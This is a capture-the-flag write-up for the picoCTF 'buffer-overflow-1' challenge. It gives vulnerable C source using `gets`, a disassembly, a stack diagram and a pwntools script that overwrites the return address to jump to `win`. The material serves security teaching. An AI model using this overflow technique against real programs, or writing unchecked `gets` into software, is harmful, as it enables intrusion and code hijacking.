# # picoCTF: buffer-overflow-1
`
Since `gets` within `vuln` does not check the input size, we can cause stack overflow to modify the return address of `vulnt` to the address of `win`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

The disasssembled `vuln` is as follows:

```
08049281 <vuln>:
 8049281:	f3 0f 1e fb          	endbr32 
 8049285:	55                   	push   %ebp
 8049286:	89 e5                	mov    %esp,%ebp
 8049288:	53                   	push   %ebx
 8049289:	83 ec 24             	sub    $0x24,%esp
 804928c:	e8 9f fe ff ff       	call   8049130 <__x86.get_pc_thunk.bx>
 8049291:	81 c3 6f 2d 00 00    	add    $0x2d6f,%ebx
 8049297:	83 ec 0c             	sub    $0xc,%esp
 804929a:	8d 45 d8             	lea    -0x28(%ebp),%eax
 804929d:	50                   	push   %eax
 804929e:	e8 ad fd ff ff       	call   8049050 <gets@plt>
 80492a3:	83 c4 10             	add    $0x10,%esp
 80492a6:	e8 93 00 00 00       	call   804933e <get_return_address>
 80492ab:	83 ec 08             	sub    $0x8,%esp
 80492ae:	50                   	push   %eax
 80492af:	8d 83 64 e0 ff ff    	lea    -0x1f9c(%ebx),%eax
 80492b5:	50                   	push   %eax
 80492b6:	e8 85 fd ff ff       	call   8049040 <printf@plt>
 80492bb:	83 c4 10             	add    $0x10,%esp
 80492be:	90                   	nop
 80492bf:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 80492c2:	c9                   	leave  
 80492c3:	c3                   	ret   
```

The stack when calling `gets` is as follows:

```
--------------------- <- esp
      0xc bytes
--------------------- <- buf (argument of `gets`)

     0x24 bytes

---------------------
      ebx (0x4 bytes)
---------------------
saved ebp (0x4 bytes)
---------------------
   return address
---------------------
```

The final script as follows:

```py
win_addr = 0x80491f6

r = process("./vuln")
r.recvuntil(b"Please enter your string:")
r.sendline(b"A"*44+p64(win_addr))
r.recvall()
```